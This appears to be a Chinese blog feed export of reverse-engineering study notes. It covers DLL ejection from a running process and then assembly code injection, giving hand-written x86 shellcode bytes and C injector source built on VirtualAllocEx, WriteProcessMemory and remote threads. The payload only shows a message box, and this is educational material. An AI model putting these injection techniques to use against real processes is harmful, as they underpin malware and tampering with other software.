class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>Takes a snapshot of the specified processes, as well as the heaps, modules, and threads used by these processes.</p><p>对指定的进程拍摄快照，保存进程相关信息的使用情况：诸如堆使用情况、模块载入情况、线程等</p></blockquote><p>CreateToolhelp32Snapshot 第一个参数dwFlags，指明那些信息应该被包括进快照</p><table><thead><tr><th>Value</th><th>Meaning</th></tr></thead><tbody><tr><td><strong>TH32CS_SNAPMODULE</strong>0x00000008</td><td>Includes all modules of the process specified in <em>th32ProcessID</em>in the snapshot. To enumerate the modules, see <a href="https://docs.microsoft.com/en-us/windows/desktop/api/tlhelp32/nf-tlhelp32-module32first">Module32First</a>. If the function fails with <strong>ERROR_BAD_LENGTH</strong>, retry the function until it succeeds.<strong>64-bit Windows:</strong> Using this flag in a 32-bit process includes the 32-bit modules of the process specified in <em>th32ProcessID</em>, while using it in a 64-bit process includes the 64-bit modules. To include the 32-bit modules of the process specified in <em>th32ProcessID</em> from a 64-bit process, use the <strong>TH32CS_SNAPMODULE32</strong> flag.</td></tr></tbody></table><p>因此语句：<code>hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID);</code>的含义是返回目标进程dwPID载入的所有模块信息的句柄存放到hSnapshot中。</p><p>接着EjectDll函数执行下面的代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bMore = <span class="built_in">Module32First</span>(hSnapshot, &amp;me);</span><br><span class="line">    <span class="keyword">for</span>( ; bMore ; bMore = <span class="built_in">Module32Next</span>(hSnapshot, &amp;me) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//比对载入的dll名称以及路径是否一致，锁定myhack.dll</span></span><br><span class="line">        <span class="keyword">if</span>( !_tcsicmp((LPCTSTR)me.szModule, szDllName) || </span><br><span class="line">            !_tcsicmp((LPCTSTR)me.szExePath, szDllName) )</span><br><span class="line">        &#123;</span><br><span class="line">            bFound = TRUE;<span class="comment">//匹配到了设置标志位bFound为true</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>遍历hSnapshot 句柄中的所有模块，依次放入bMore，进行判断(路径 &amp; dll名称都要准确)，看是否是我们将要从目标进程中卸载的dll，贴一下（me变量）MODULEENTRY32结构体，这一步结束me中存放的是待卸载dll的信息</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tagMODULEENTRY32</span> &#123;</span><br><span class="line">  DWORD   dwSize;</span><br><span class="line">  DWORD   th32ModuleID;</span><br><span class="line">  DWORD   th32ProcessID;</span><br><span class="line">  DWORD   GlblcntUsage;</span><br><span class="line">  DWORD   ProccntUsage;</span><br><span class="line">  BYTE    *modBaseAddr;</span><br><span class="line">  DWORD   modBaseSize;</span><br><span class="line">  HMODULE hModule;</span><br><span class="line">  <span class="type">char</span>    szModule[MAX_MODULE_NAME32 + <span class="number">1</span>];</span><br><span class="line">  <span class="type">char</span>    szExePath[MAX_PATH];</span><br><span class="line">&#125; MODULEENTRY32;</span><br></pre></td></tr></table></figure><p>接下来<code>hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID</code>尝试以PROCESS_ALL_ACCESS权限打开目标进程</p><p>获取系统的kernel32.dll中的FreeLibrary API地址，调用CreateRemoteThread，设置回调函数以及传递参数，在线程中调用FreeLibrary 完成对目标进程中目标dll的卸载工作。</p><h3 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h3><p>API– CreateToolhelp32Snapshot，对进程在系统中的信息执行快照</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateToolhelp32Snapshot</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD dwFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD th32ProcessID</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>文中两次调用中第一个参数dwFlags有所区别：第一次 &#x3D; <strong>TH32CS_SNAPALL</strong>，第二次 &#x3D; <strong>TH32CS_SNAPMODULE</strong>，获取到的内容也不同。详情查看<a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">微软文档</a>API如预期的执行会返回相应的句柄，可以对进行遍历。</p><p>第一次调用是为了找到目标进程PID，因此获取到的句柄时系统中所有进程的快照，使用类似如下代码遍历：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hSnapShot是CreateToolhelp32Snapshot返回的句柄，其中存放进程快照信息</span></span><br><span class="line"><span class="built_in">Process32First</span>(hSnapShot, &amp;pe);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!_tcsicmp(szProcessName, (LPCTSTR)pe.szExeFile))</span><br><span class="line">        &#123;</span><br><span class="line">            dwPID = pe.th32ProcessID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">Process32Next</span>(hSnapShot, &amp;pe));<span class="comment">//循环比对</span></span><br></pre></td></tr></table></figure><p>第二次调用是在第一次执行获取了目标进程的PID后需要从其载入的DLL中找到待卸载DLL，使用类似如下代码遍历：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hSnapshot存放CreateToolhelp32Snapshot返回的句柄，这次是目标进程中载入的所有模块快照信息</span></span><br><span class="line">bMore = <span class="built_in">Module32First</span>(hSnapshot, &amp;me);</span><br><span class="line">    <span class="keyword">for</span>( ; bMore ; bMore = <span class="built_in">Module32Next</span>(hSnapshot, &amp;me) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>( !_tcsicmp((LPCTSTR)me.szModule, szDllName) || </span><br><span class="line">            !_tcsicmp((LPCTSTR)me.szExePath, szDllName) )</span><br><span class="line">        &#123;</span><br><span class="line">            bFound = TRUE;<span class="comment">//匹配到了设置标志位bFound为true</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>本节内容主要的内容在于查找目标进程以及目标进程中待卸载的DLL，真正完成卸载的部分并不算有难度。</p>]]></content>
      
      
      <categories>
          
          <category> -逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《逆向工程核心原理学习》 </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆核系列No.12--汇编代码注入</title>
      <link href="/2022/05/07/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-12-%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/05/07/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-12-%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>本节我们依旧探讨代码注入（CodeInject），相比先前代码注入的篇章，不同的是，这次我们借助OllyDbg的汇编工程，注入的代码为汇编指令字节码的形式写入我们的代码。</p><h4 id="汇编代码编写"><a href="#汇编代码编写" class="headerlink" title="汇编代码编写"></a>汇编代码编写</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">004010ED    55               PUSH EBP</span><br><span class="line">004010EE    8BEC             MOV EBP,ESP</span><br><span class="line">004010F0    8B75 08          MOV ESI,DWORD PTR SS:[EBP+8]       ; ESI = pParam 使用注入器注入目标进程会获取          </span><br><span class="line">004010F3    68 6C6C0000      PUSH 6C6C                      </span><br><span class="line">004010F8    68 33322E64      PUSH 642E3233</span><br><span class="line">004010FD    68 75736572      PUSH 72657375</span><br><span class="line">00401102    54               PUSH ESP                           ; - &quot;user32.dll&quot;</span><br><span class="line">00401103    FF16             CALL DWORD PTR DS:[ESI]            ; DS:[esi]中是API地址 LoadLibraryA(&quot;user32.dll&quot;)</span><br><span class="line">00401105    68 6F784100      PUSH 41786F</span><br><span class="line">0040110A    68 61676542      PUSH 42656761</span><br><span class="line">0040110F    68 4D657373      PUSH 7373654D</span><br><span class="line">00401114    54               PUSH ESP                           ; - &quot;MessageBoxA&quot;</span><br><span class="line">00401115    50               PUSH EAX                           ; - hMod</span><br><span class="line">00401116    FF56 04          CALL DWORD PTR DS:[ESI+4]          ; GetProcAddress(hMod, &quot;MessageBoxA&quot;)</span><br><span class="line">00401119    6A 00            PUSH 0                             ; - MB_OK (0)</span><br><span class="line">0040111B    E8 0C000000      CALL 0040112C</span><br><span class="line">00401120                     &lt;ASCII&gt;                            ; - &quot;ReverseCore&quot;, 0</span><br><span class="line">0040112C    E8 14000000      CALL 00401145</span><br><span class="line">00401131                     &lt;ASCII&gt;                            ; - &quot;www.reversecore.com&quot;, 0</span><br><span class="line">00401145    6A 00            PUSH 0                             ; - hWnd (0)</span><br><span class="line">00401147    FFD0             CALL EAX                           ; MessageBoxA(0, &quot;www.reversecore.com&quot;, &quot;ReverseCore&quot;, 0)</span><br><span class="line">00401149    33C0             XOR EAX,EAX                        </span><br><span class="line">0040114B    8BE5             MOV ESP,EBP</span><br><span class="line">0040114D    5D               POP EBP                            </span><br><span class="line">0040114E    C3               RETN</span><br></pre></td></tr></table></figure><p>其实代码的完成的功能是上节的<code>ThreadProc</code>的函数功能，为了方便理解，在po一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">DWORD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">    PTHREAD_PARAM   pParam      = (PTHREAD_PARAM)lParam;</span><br><span class="line">    HMODULE         hMod        = <span class="literal">NULL</span>;</span><br><span class="line">    FARPROC         pFunc       = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LoadLibrary()</span></span><br><span class="line">    hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[<span class="number">0</span>])(pParam-&gt;szBuf[<span class="number">0</span>]);    <span class="comment">// &quot;user32.dll&quot;</span></span><br><span class="line">    <span class="keyword">if</span>( !hMod )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// GetProcAddress()</span></span><br><span class="line">    pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[<span class="number">1</span>])(hMod, pParam-&gt;szBuf[<span class="number">1</span>]);  <span class="comment">// &quot;MessageBoxA&quot;</span></span><br><span class="line">    <span class="keyword">if</span>( !pFunc )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// MessageBoxA()</span></span><br><span class="line">    ((PFMESSAGEBOXA)pFunc)(<span class="literal">NULL</span>, pParam-&gt;szBuf[<span class="number">2</span>], pParam-&gt;szBuf[<span class="number">3</span>], MB_OK);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中在函数体内部用到的一些字符串以及kernel32的API都是设置好的，并且由结构体lParam提交的。</p><p>回到汇编代码的编写，这里对重要的进行说明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004010F0    8B75 08          MOV ESI,DWORD PTR SS:[EBP+8]</span><br></pre></td></tr></table></figure><p>这里是由函数调用决定的，可以知道函数<code>ThreadProc </code>的参数是通过栈传递的，且只有一个参数，因此通过访问<code>SS:[EBP+8]</code>就是参数<code>lParam</code>的地址了。<code>lParam</code>参数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hMod = GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line"><span class="comment">// set THREAD_PARAM</span></span><br><span class="line">    param.pFunc[<span class="number">0</span>] = GetProcAddress(hMod, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    param.pFunc[<span class="number">1</span>] = GetProcAddress(hMod, <span class="string">&quot;GetProcAddress&quot;</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">0</span>], <span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">1</span>], <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">2</span>], <span class="string">&quot;www.reversecore.com&quot;</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">3</span>], <span class="string">&quot;ReverseCore&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">004010F3    68 6C6C0000      PUSH 6C6C                      </span><br><span class="line">004010F8    68 33322E64      PUSH 642E3233</span><br><span class="line">004010FD    68 75736572      PUSH 72657375</span><br><span class="line">00401102    54               PUSH ESP                           ; - &quot;user32.dll&quot;</span><br><span class="line">00401103    FF16             CALL DWORD PTR DS:[ESI]</span><br></pre></td></tr></table></figure><p>代码前四行完成的是将构造出字符串<code>user32.dll</code>，由于是入栈的操作，因此当前的esp指向的是字符串<code>user32.dll</code>的首地址，此时<code>CALL DWORD PTR DS:[ESI]</code>此时会完成<code>LoadLibraryA(user32.dll)</code></p><p>此时，Eax存放的是<code>user32.dll</code>的句柄。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00401105    68 6F784100      PUSH 41786F</span><br><span class="line">0040110A    68 61676542      PUSH 42656761</span><br><span class="line">0040110F    68 4D657373      PUSH 7373654D</span><br><span class="line">00401114    54               PUSH ESP                           ; - &quot;MessageBoxA&quot;</span><br><span class="line">00401115    50               PUSH EAX                           ; - hMod</span><br><span class="line">00401116    FF56 04          CALL DWORD PTR DS:[ESI+4]  </span><br></pre></td></tr></table></figure><p>同样的手法，安排栈中元素，设置esp指向将要使用的字符串<code>MessageBoxA</code>首地址，再传入先前<code>LoadLibraryA(user32.dll)</code>获取到的<code>user32.dll</code>的句柄（存放在EAX中）。随后调用<code>DS:[ESI+4] </code>，这里取到的是传递给<code>ThreadProc</code>的参数结构体中的<code>GetProcAddress</code>，所以上述的汇编代码完成的<code>GetProcAddress(hMod, &quot;MessageBoxA&quot;)</code>获取到<code>user32.MessageBoxA</code> API的地址。</p><p>PS：这里可以好好学习通过push操作，在栈中放置参数的手法。</p><p>经过上述的代码后，EAX存放的是<code>user32.MessageBoxA</code> API的地址。接下来就该调用了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00401119    6A 00            PUSH 0                             ; - MB_OK (0)</span><br><span class="line">0040111B    E8 0C000000      CALL 0040112C</span><br><span class="line">00401120                     &lt;ASCII&gt;                 ; - &quot;ReverseCore&quot;, 0</span><br><span class="line">0040112C    E8 14000000      CALL 00401145</span><br><span class="line">00401131                     &lt;ASCII&gt;                    ; - &quot;www.reversecore.com&quot;, 0</span><br><span class="line">00401145    6A 00            PUSH 0                             ; - hWnd (0)</span><br><span class="line">00401147    FFD0             CALL EAX</span><br></pre></td></tr></table></figure><p>这里初次看到时感觉设置参数的方式很惊艳，是通过<code>call</code>指令完成参数入栈的，原理如何？</p><p>需要了解<code>call</code>指令的运作细节，<code>call</code>指令会将下一条指令的地址进行入栈（十分关键）。然后跑去执行call的主体，随后当call主体进行retn时，将先前入栈的指令地址接着往下的执行流程。</p><p>在<code>0040111B</code>处执行了<code>CALL 0040112C</code>，此时会将下一个“指令”地址进行入栈，但由于下一条“指令”并非指令，而是设置好的字符串内容，此时的入栈相当于<code>MessageBoxA</code>参数字符串<code>ReverseCore</code>入栈了。</p><p>随后会跳向call的主体内容的位置<code>0040112C</code>，然后系统又发现了一个call指令，同样的操作，将<code>MessageBoxA</code>参数又一字符串<code>www.reversecore.com</code>入栈了。当然这里观察call的地址会发现猫腻，<code>CALL 00401145</code>，直接往下就是正常执行了，最后调用<code>CALL EAX(MessageBoxA)</code></p><p>至此，需要的汇编指令编写完毕，只需在调用这段代码前，保证参数<code>lParam</code>入栈即可。</p><h4 id="CodeInject2源码分析"><a href="#CodeInject2源码分析" class="headerlink" title="CodeInject2源码分析"></a>CodeInject2源码分析</h4><p>在开始分析CodeInject2源码前，需要做一些准备工作。</p><p>编写完上述代码，我们只需要保存他的字节码即可</p><h5 id="获取字节码"><a href="#获取字节码" class="headerlink" title="获取字节码"></a>获取字节码</h5><p>OD随意载入一个不需要的程序（这里我复制了一份notepad.exe），</p><img src="/2022/05/07/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-12-%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1.png" class=""><p>敲完ThreadProc的汇编代码之后，选择复制到可执行文件，在接下来的窗口中保存：</p><img src="/2022/05/07/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-12-%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/2.png" class=""><p>保存修改到ThreadProc.exe，在使用OD打开。</p><img src="/2022/05/07/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-12-%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/3.png" class=""><p>在数据窗口跟踪这些指令，然后完整的复制到文件ThreadProc.txt文件中</p><img src="/2022/05/07/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-12-%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/4.png" class=""><img src="/2022/05/07/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-12-%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/5.png" class=""><p>去除不必要的内容，地址，注释部分，并在每个字节前面加0x，得到字节码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x55, 0x8B, 0xEC, 0x8B, 0x75, 0x08, 0x68, 0x6C, 0x6C, 0x00,</span><br><span class="line">0x00, 0x68, 0x33, 0x32, 0x2E, 0x64, 0x68, 0x75, 0x73, 0x65,</span><br><span class="line">0x72, 0x54, 0xFF, 0x16, 0x68, 0x6F, 0x78, 0x41, 0x00, 0x68,</span><br><span class="line">0x61, 0x67, 0x65, 0x42, 0x68, 0x4D, 0x65, 0x73, 0x73, 0x54,</span><br><span class="line">0x50, 0xFF, 0x56, 0x04, 0x6A, 0x00, 0xE8, 0x0C, 0x00, 0x00,</span><br><span class="line">0x00, 0x52, 0x65, 0x76, 0x65, 0x72, 0x73, 0x65, 0x43, 0x6F,</span><br><span class="line">0x72, 0x65, 0x00, 0xE8, 0x14, 0x00, 0x00, 0x00, 0x77, 0x77,</span><br><span class="line">0x77, 0x2E, 0x72, 0x65, 0x76, 0x65, 0x72, 0x73, 0x65, 0x63,</span><br><span class="line">0x6F, 0x72, 0x65, 0x2E, 0x63, 0x6F, 0x6D, 0x00, 0x6A, 0x00,</span><br><span class="line">0xFF, 0xD0, 0x33, 0xC0, 0x8B, 0xE5, 0x5D, 0xC3</span><br></pre></td></tr></table></figure><p>在保证参数<code>lParam</code>入栈的情况下，这段代码是可以直接上CPU运行的。</p><h5 id="CodeInject2-main"><a href="#CodeInject2-main" class="headerlink" title="CodeInject2.main"></a>CodeInject2.main</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD dwPID     = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( argc != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n USAGE  : %s &lt;pid&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// change privilege</span></span><br><span class="line">    <span class="keyword">if</span>( !SetPrivilege(SE_DEBUG_NAME, TRUE) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// code injection</span></span><br><span class="line">    dwPID = (DWORD)atol(argv[<span class="number">1</span>]);</span><br><span class="line">    InjectCode(dwPID);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和先前文章的一致，不做赘述。</p><p>关注<code>InjectCode函数</code>即可：</p><h5 id="CodeInject2-InjectCode"><a href="#CodeInject2-InjectCode" class="headerlink" title="CodeInject2.InjectCode"></a>CodeInject2.InjectCode</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">InjectCode</span><span class="params">(DWORD dwPID)</span></span><br><span class="line">&#123;</span><br><span class="line">    HMODULE         hMod            = <span class="literal">NULL</span>;</span><br><span class="line">    THREAD_PARAM    param           = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    HANDLE          hProcess        = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE          hThread         = <span class="literal">NULL</span>;</span><br><span class="line">    LPVOID          pRemoteBuf[<span class="number">2</span>]   = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line"></span><br><span class="line">    hMod = GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set THREAD_PARAM</span></span><br><span class="line">    param.pFunc[<span class="number">0</span>] = GetProcAddress(hMod, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    param.pFunc[<span class="number">1</span>] = GetProcAddress(hMod, <span class="string">&quot;GetProcAddress&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open Process</span></span><br><span class="line">    <span class="keyword">if</span> ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE, dwPID)) )                        </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OpenProcess() fail : err_code = %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocation for THREAD_PARAM</span></span><br><span class="line">    <span class="keyword">if</span>( !(pRemoteBuf[<span class="number">0</span>] = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(THREAD_PARAM),  MEM_COMMIT, PAGE_READWRITE)) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx() fail : err_code = %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !WriteProcessMemory(hProcess, pRemoteBuf[<span class="number">0</span>],</span><br><span class="line">                            (LPVOID)&amp;param, <span class="keyword">sizeof</span>(THREAD_PARAM), <span class="literal">NULL</span>) )                                 </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory() fail : err_code = %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocation for ThreadProc()</span></span><br><span class="line">    <span class="keyword">if</span>( !(pRemoteBuf[<span class="number">1</span>] = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(g_InjectionCode),</span><br><span class="line">                                         MEM_COMMIT, PAGE_EXECUTE_READWRITE)) ) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx() fail : err_code = %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !WriteProcessMemory(hProcess, pRemoteBuf[<span class="number">1</span>], (LPVOID)&amp;g_InjectionCode,</span><br><span class="line">                            <span class="keyword">sizeof</span>(g_InjectionCode), <span class="literal">NULL</span>) ) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory() fail : err_code = 